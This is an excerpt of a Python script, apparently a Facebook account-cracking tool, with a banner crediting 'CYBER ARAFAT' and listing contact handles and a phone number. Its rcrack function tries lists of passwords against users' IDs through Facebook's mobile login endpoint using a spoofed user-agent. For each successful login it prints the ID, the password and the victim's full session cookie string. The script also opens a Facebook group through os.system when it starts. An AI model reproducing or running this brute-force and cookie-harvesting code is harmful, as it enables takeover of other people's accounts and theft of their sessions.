...
ha = current.day
today = date.today()
os.system('xdg-open https://www.facebook.com/groups/248309556284516/?ref=share')
logo =("""\033[0;92m
╔═══════════════════════════════════════════════════╗
║ \033[0;92m 
║ $$$$$$\  $$$$$$$\   $$$$$$\  $$$$$$$$\  $$$$$$\ $$$$$$$$\ 
...
\033[0;94m╠═══════════════════════════════════════════════════║
\033[0;93m╠══[Author:=======================> \33[1;38m𝘾𝙔𝘽𝙀𝙍 𝘼𝙍𝘼𝙁𝘼𝙏\33[1;38m       ║\033[1;31m
╠══[Facebook:=====================> PrinceArafat770      ║  \033[1;97m
╠══[Github:=======================> \33[1;38mPRINCE-ARAFAT      ║\33[1;34m
╠══[Whatsapp:=====================> 01943520447    ║\33[1;35m
...
def rcrack(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            'user-agent': 'Mozilla/5.0 (X11; U; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/113.0.5552.210 Chrome/113.0.5552.210 Safari/537.36',}
            lo = session.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print('\r\r\033[1;32m[𝘾𝙔𝘽𝙀𝙍 𝘼𝙍𝘼𝙁𝘼𝙏💚] \033[0;97m'+uid+'\033[1;32m | \033[0;93m' +ps+    '  \n[‎‎🌺]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s{x}[{xr}𝘾𝙔𝘽𝙀𝙍 𝘼𝙍𝘼𝙁𝘼𝙏{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
